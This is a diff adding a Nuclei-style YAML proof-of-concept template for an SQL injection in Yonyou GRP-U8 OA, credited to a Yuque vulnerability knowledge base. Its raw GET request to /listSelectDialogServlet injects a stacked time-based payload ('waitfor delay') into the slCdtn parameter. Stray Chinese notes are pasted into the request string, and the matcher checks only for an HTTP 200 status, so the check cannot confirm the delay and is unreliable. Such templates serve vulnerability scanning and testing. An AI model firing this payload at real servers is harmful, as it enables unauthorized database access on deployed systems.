@@ -1,0 +1,34 @@
+id: poc-akz1ob7b326m9e1g
+info:
+  name: 用友 OA GRP-u8 sql注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/akz1ob7b326m9e1g'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: akz1ob7b326m9e1g
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /listSelectDialogServlet?slType=slFZX&slCdtn=1=2;waitfor%20delay%20''0:0:5'' HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    \[\]
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
